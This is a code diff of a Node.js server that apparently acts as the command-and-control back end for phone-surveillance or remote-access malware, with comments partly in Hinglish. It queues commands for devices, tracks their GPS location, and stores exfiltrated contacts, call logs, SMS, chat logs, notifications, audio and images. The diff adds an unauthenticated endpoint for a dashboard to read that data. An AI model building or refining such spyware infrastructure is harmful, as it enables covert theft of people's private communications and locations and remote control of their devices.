@@ -62,11 +62,10 @@ io.on('connection', (socket) => {
 
     // 3. Control Events
     socket.on('control-event', (data) => {
-        // console.log(`🎮 Control Event: ${data.action}`);
         socket.to(data.room).emit('control-event', data);
     });
 
-    // 4. Command Handling
+    // 4. Command Handling (Socket)
     socket.on('send-command', (data) => {
         if (data.targetId && data.command) {
             io.to(data.targetId).emit('command', data.command);
@@ -91,7 +90,7 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: Duplicate Fix Applied!');
+    res.send('✅ Server Running: Duplicate Data Fixed!');
 });
 
 // ==================================================
@@ -119,7 +118,7 @@ app.post('/api/upload-image', (req, res) => {
 });
 
 // ==================================================
-//  ✅ AUDIO UPLOAD
+//  ✅ AUDIO UPLOAD & HISTORY
 // ==================================================
 app.post('/api/upload-audio', (req, res) => {
     let { device_id, audio_data, filename } = req.body; 
@@ -174,7 +173,7 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
 });
 
 // ==================================================
-//  🔥 FIXED STATUS & COMMAND HANDLING
+//  🔥 STATUS & COMMAND (Loop Fix Included)
 // ==================================================
 
 app.get('/api/admin/all-devices', (req, res) => {
@@ -196,13 +195,12 @@ app.post('/api/status', (req, res) => {
 
         const id = device_id.toString().trim().toUpperCase();
         
-        // 🔥 FIX: Command ek baar bhejo, fir 'none' kar do
+        // 🔥 FIX: Command ek baar bhejo, fir turant 'none' kar do
         let commandToSend = "none";
         if (devicesStatus[id] && devicesStatus[id].command) {
             commandToSend = devicesStatus[id].command;
         }
 
-        // Update Status
         devicesStatus[id] = {
             ...devicesStatus[id], 
             id: id,
@@ -215,7 +213,7 @@ app.post('/api/status', (req, res) => {
             accuracy: accuracy || (devicesStatus[id]?.accuracy || 0),
             speed: speed || (devicesStatus[id]?.speed || 0),
             lastSeen: Date.now(),
-            command: "none" // 🔥 IMPORTANT: Hamesha reset karo taaki loop na bane
+            command: "none" // 🔥 IMPORTANT: Reset to prevent loop
         };
 
         res.json({ status: "success", command: commandToSend });
@@ -225,7 +223,7 @@ app.post('/api/status', (req, res) => {
 });
 
 // ==================================================
-//  🔥 FIXED DATA STORAGE (NO DUPLICATES)
+//  🔥 DATA STORAGE (Duplicate Fix Applied)
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
@@ -239,7 +237,7 @@ app.post('/api/upload_data', async (req, res) => {
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
         let finalData = parsedData;
 
-        // --- LOCATION HANDLING ---
+        // --- LOCATION UPDATE ---
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
             if (locObj && (locObj.lat || locObj.latitude)) {
@@ -250,14 +248,13 @@ app.post('/api/upload_data', async (req, res) => {
             }
         }
 
-        // --- 🔥 CRITICAL FIX: OVERWRITE vs APPEND ---
-        // In cheezo ko hamesha OVERWRITE karo (Duplicate hatane ke liye)
+        // 🔥 CRITICAL FIX: CONTACTS & CALL LOGS SHOULD OVERWRITE (REPLACE) 🔥
         if (['contacts', 'installed_apps', 'call_logs'].includes(type)) {
-             // Sirf naya data rakho (Purana delete)
+             // Inka data humesha replace karo (Jodo mat)
              finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
         } 
-        // In cheezo ko APPEND karo (Jodte raho)
-        else if (['notifications', 'sms', 'chat_logs', 'location'].includes(type)) {
+        // 🔥 CHAT, SMS, NOTIFICATIONS SHOULD APPEND (ADD) 🔥
+        else {
             let existingData = [];
             try {
                 if (fs.existsSync(filePath)) {
@@ -268,22 +265,36 @@ app.post('/api/upload_data', async (req, res) => {
 
             let newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
             
-            // Chat Logs unique handle karne ke liye timestamp add karo
+            // Chat Logs unique handle karne ke liye
             if (type === 'chat_logs') {
                 newDataArray = newDataArray.map(msg => ({ ...msg, timestamp: msg.timestamp || Date.now() }));
             }
             
-            // Naya + Purana
-            finalData = [...newDataArray, ...existingData].slice(0, 3000); // Keep max 3000 logs
+            // Naya + Purana (Limit 5000)
+            finalData = [...newDataArray, ...existingData].slice(0, 5000); 
         }
 
-        // Save to File
         await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
         res.json({ status: "success" });
 
     } catch (error) {
-        console.error("Data Write Error:", error);
+        console.error("Write Error:", error);
         res.status(500).json({ status: "error" });
+    }
+});
+
+// ✅ MISSING API: Dashboard ko data dikhane ke liye ye zaroori hai
+app.get('/api/get-data/:device_id/:type', async (req, res) => {
+    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
+    try {
+        if (fs.existsSync(filePath)) {
+            const readStream = fs.createReadStream(filePath);
+            readStream.pipe(res);
+        } else {
+            res.json([]);
+        }
+    } catch (e) {
+        res.json([]);
     }
 });
 
